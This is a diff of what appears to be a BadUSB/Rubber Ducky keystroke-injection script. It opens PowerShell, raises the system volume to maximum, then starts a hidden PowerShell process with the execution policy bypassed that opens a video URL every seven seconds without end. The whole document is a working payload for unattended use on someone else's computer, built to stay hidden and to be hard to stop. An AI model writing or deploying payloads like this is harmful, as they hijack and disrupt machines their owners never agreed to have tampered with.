@@ -6,5 +6,8 @@ DELAY 1000
 STRING powershell
 ENTER
 DELAY 1000
-STRING Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command for ($i=0; $i -lt 50; $i++) { (new-object -com wscript.shell).SendKeys([char]175) }; while (`$true) { Start-Process 'https://streamable.com/lf027o'; Start-Sleep -Seconds 7 }"; exit
+STRING for ($i=0; $i -lt 50; $i++) { (new-object -com wscript.shell).SendKeys([char]175) }
+ENTER
+DELAY 1000
+STRING Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command while (`$true) { Start-Process 'https://streamable.com/lf027o'; Start-Sleep -Seconds 7 }"; exit
 ENTER
